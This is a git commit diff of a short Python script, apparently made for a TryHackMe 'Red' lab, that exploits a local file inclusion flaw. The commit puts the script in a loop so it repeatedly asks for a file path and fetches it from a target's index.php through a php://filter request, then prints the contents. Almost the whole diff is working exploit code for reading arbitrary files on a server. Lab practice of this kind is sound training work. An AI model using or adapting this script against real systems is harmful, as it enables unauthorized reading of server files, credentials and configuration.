0fdbb83e48477379a06e677017224c3de626cb36
Praison001 <60835238+Praison001@users.noreply.github.com>
2023-07-23 23:03:18 +0530

    Implemented everything under a while loop

--- THM Red/LFIForTHM-Red.py
+++ THM Red/LFIForTHM-Red.py
@@ -2,15 +2,10 @@ import requests
 
 #Getting the IP and the file to be accessed from the user
 IP = input("Enter the target IP: ")
-File= input("Enter the file that you want to access using LFI: ")
 
-def fetchingResponse(IP,File):
-	if IP and File:
-		print("Fetching the file....\n")
-		response = requests.get(f"http://{IP}/index.php?page=php://filter/resource={File}")
-		response_text = response.text
-		print(response_text)
-	else:
-		print("Try again with the correct IP and file name")
-		
-fetchingResponse(IP,File)
+while True:
+	File= input("Enter the file that you want to access using LFI: ")
+	print("Fetching the file....\n")
+	response = requests.get(f"http://{IP}/index.php?page=php://filter/resource={File}")
+	response_text = response.text
+	print(response_text)
